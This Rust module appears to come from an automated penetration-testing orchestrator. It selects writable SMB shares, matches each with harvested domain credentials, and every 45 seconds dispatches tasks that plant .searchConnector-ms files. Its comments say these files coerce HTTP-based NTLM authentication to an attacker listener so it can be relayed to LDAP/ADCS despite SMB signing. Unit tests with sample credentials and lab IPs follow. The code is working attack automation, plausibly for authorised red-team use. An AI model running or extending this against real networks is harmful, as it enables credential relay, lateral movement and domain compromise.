//! auto_searchconnector_coercion -- drop .searchConnector-ms files on writable shares.
//!
//! .searchConnector-ms XML files trigger WebDAV connections when a user browses
//! the share in Explorer. Unlike .lnk/.scf/.url (handled by auto_share_coercion),
//! searchConnector files force HTTP-based NTLM auth which bypasses SMB signing
//! requirements, enabling relay to LDAP/ADCS even when SMB signing is enforced.
//!
//! This module targets writable shares that auto_share_coercion has already
//! identified, deploying a complementary coercion technique.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Collect SearchConnector coercion work items from current state.
///
/// Pure logic extracted from `auto_searchconnector_coercion` so it can be
/// unit-tested without needing a `Dispatcher` or async runtime.
fn collect_searchconnector_work(state: &StateInner, listener: &str) -> Vec<SearchConnectorWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();

    for share in &state.shares {
        if !share.permissions.to_uppercase().contains("WRITE") {
            continue;
        }

        let dedup_key = format!("searchconn:{}:{}", share.host, share.name);
        if state.is_processed(DEDUP_SEARCHCONNECTOR, &dedup_key) {
            continue;
        }

        // Find credential for the share's host
        let host_info = state.hosts.iter().find(|h| h.ip == share.host);
        let domain = host_info
            .and_then(|h| {
                h.hostname
                    .find('.')
                    .map(|i| h.hostname[i + 1..].to_lowercase())
            })
            .unwrap_or_default();

        let cred = state
            .credentials
            .iter()
            .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
            .or_else(|| state.credentials.first())
            .cloned();

        let Some(cred) = cred else {
            continue;
        };

        items.push(SearchConnectorWork {
            dedup_key,
            share_host: share.host.clone(),
            share_name: share.name.clone(),
            listener: listener.to_string(),
            credential: cred,
        });
    }

    items
}

/// Drops .searchConnector-ms coercion files on writable shares.
/// Interval: 45s.
pub async fn auto_searchconnector_coercion(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("searchconnector_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<SearchConnectorWork> = {
            let state = dispatcher.state.read().await;
            collect_searchconnector_work(&state, &listener)
        };

        for item in work {
            let payload = json!({
                "technique": "searchconnector_coercion",
                "target_ip": item.share_host,
                "share_name": item.share_name,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("searchconnector_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.share_host,
                        share = %item.share_name,
                        "searchConnector-ms coercion file dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SEARCHCONNECTOR, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SEARCHCONNECTOR, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(host = %item.share_host, "searchConnector coercion deferred");
                }
                Err(e) => {
                    warn!(err = %e, host = %item.share_host, "Failed to dispatch searchConnector coercion");
                }
            }
        }
    }
}

struct SearchConnectorWork {
    dedup_key: String,
    share_host: String,
    share_name: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::orchestrator::state::StateInner;
    use ares_core::models::{Credential, Host, Share};

    fn make_credential(username: &str, password: &str, domain: &str) -> Credential {
        Credential {
            id: format!("c-{username}"),
            username: username.into(),
            password: password.into(), // pragma: allowlist secret
            domain: domain.into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_share(host: &str, name: &str, permissions: &str) -> Share {
        Share {
            host: host.into(),
            name: name.into(),
            permissions: permissions.into(),
            comment: String::new(),
            authenticated_as: None,
        }
    }

    fn make_host(ip: &str, hostname: &str) -> Host {
        Host {
            ip: ip.into(),
            hostname: hostname.into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        }
    }

    #[test]
    fn dedup_key_format() {
        let key = format!("searchconn:{}:{}", "192.168.58.22", "Public");
        assert_eq!(key, "searchconn:192.168.58.22:Public");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_SEARCHCONNECTOR, "searchconnector");
    }

    #[test]
    fn writable_share_detection() {
        let write_perms = ["WRITE", "READ/WRITE", "rw WRITE access"];
        for p in &write_perms {
            assert!(
                p.to_uppercase().contains("WRITE"),
                "{p} should be detected as writable"
            );
        }
    }

    #[test]
    fn readonly_share_rejected() {
        let perm = "READ";
        assert!(!perm.to_uppercase().contains("WRITE"));
    }

    #[test]
    fn domain_from_host_hostname() {
        let hostname = "srv01.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "contoso.local");
    }

    #[test]
    fn payload_structure_validation() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let payload = serde_json::json!({
            "technique": "searchconnector_coercion",
            "target_ip": "192.168.58.22",
            "share_name": "Public",
            "listener_ip": "192.168.58.50",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });

        assert_eq!(payload["technique"], "searchconnector_coercion");
        assert_eq!(payload["target_ip"], "192.168.58.22");
        assert_eq!(payload["share_name"], "Public");
        assert_eq!(payload["listener_ip"], "192.168.58.50");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn writable_share_full_permission() {
        let perm = "FULL";
        // FULL does not contain WRITE, so it should NOT be detected
        assert!(!perm.to_uppercase().contains("WRITE"));
    }

    #[test]
    fn domain_from_fqdn_with_subdomain() {
        let hostname = "web01.sub.contoso.local";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "sub.contoso.local");
    }

    #[test]
    fn domain_from_bare_hostname() {
        let hostname = "dc01";
        let domain = hostname
            .find('.')
            .map(|i| hostname[i + 1..].to_lowercase())
            .unwrap_or_default();
        assert_eq!(domain, "");
    }

    #[test]
    fn dedup_key_special_characters_in_share_name() {
        let key = format!("searchconn:{}:{}", "192.168.58.10", "Share With Spaces");
        assert_eq!(key, "searchconn:192.168.58.10:Share With Spaces");

        let key2 = format!("searchconn:{}:{}", "192.168.58.10", "data$");
        assert_eq!(key2, "searchconn:192.168.58.10:data$");
    }

    #[test]
    fn work_struct_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "svc_admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };

        let work = SearchConnectorWork {
            dedup_key: "searchconn:192.168.58.22:Public".into(),
            share_host: "192.168.58.22".into(),
            share_name: "Public".into(),
            listener: "192.168.58.50".into(),
            credential: cred,
        };

        assert_eq!(work.dedup_key, "searchconn:192.168.58.22:Public");
        assert_eq!(work.share_host, "192.168.58.22");
        assert_eq!(work.share_name, "Public");
        assert_eq!(work.listener, "192.168.58.50");
        assert_eq!(work.credential.username, "svc_admin");
        assert_eq!(work.credential.domain, "contoso.local");
    }

    #[test]
    fn case_insensitive_permission_matching() {
        let perms = ["write", "Write", "WRITE", "read/Write", "Read/WRITE"];
        for p in &perms {
            assert!(
                p.to_uppercase().contains("WRITE"),
                "{p} should be detected as writable regardless of case"
            );
        }
    }

    // --- collect_searchconnector_work tests ---

    #[test]
    fn collect_empty_state_returns_no_work() {
        let state = StateInner::new("test-op".into());
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_credentials_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "WRITE"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_no_shares_returns_no_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_writable_share_produces_work() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "WRITE"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].share_host, "192.168.58.22");
        assert_eq!(work[0].share_name, "Public");
        assert_eq!(work[0].dedup_key, "searchconn:192.168.58.22:Public");
        assert_eq!(work[0].listener, "192.168.58.50");
    }

    #[test]
    fn collect_readonly_share_skipped() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "READ"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_dedup_skips_already_processed() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "WRITE"));
        state.mark_processed(
            DEDUP_SEARCHCONNECTOR,
            "searchconn:192.168.58.22:Public".into(),
        );
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert!(work.is_empty());
    }

    #[test]
    fn collect_prefers_domain_matched_credential() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("crossuser", "Cross!1", "fabrikam.local")); // pragma: allowlist secret
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .hosts
            .push(make_host("192.168.58.22", "srv01.contoso.local"));
        state
            .shares
            .push(make_share("192.168.58.22", "Data", "READ/WRITE"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "admin");
        assert_eq!(work[0].credential.domain, "contoso.local");
    }

    #[test]
    fn collect_falls_back_to_first_credential_no_host() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
                                                                           // No host entry for this share IP, so domain is empty -> falls back to first cred
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "WRITE"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "admin");
    }

    #[test]
    fn collect_multiple_shares_produces_work_for_each() {
        let mut state = StateInner::new("test-op".into());
        state
            .credentials
            .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
        state
            .shares
            .push(make_share("192.168.58.22", "Public", "WRITE"));
        state
            .shares
            .push(make_share("192.168.58.22", "Data", "READ/WRITE"));
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 2);
        let names: Vec<&str> = work.iter().map(|w| w.share_name.as_str()).collect();
        assert!(names.contains(&"Public"));
        assert!(names.contains(&"Data"));
    }

    #[tokio::test]
    async fn collect_via_shared_state() {
        let shared = SharedState::new("test-op".into());
        {
            let mut state = shared.write().await;
            state
                .credentials
                .push(make_credential("admin", "P@ssw0rd!", "contoso.local")); // pragma: allowlist secret
            state
                .shares
                .push(make_share("192.168.58.22", "Public", "WRITE"));
        }
        let state = shared.read().await;
        let work = collect_searchconnector_work(&state, "192.168.58.50");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].share_host, "192.168.58.22");
    }
}
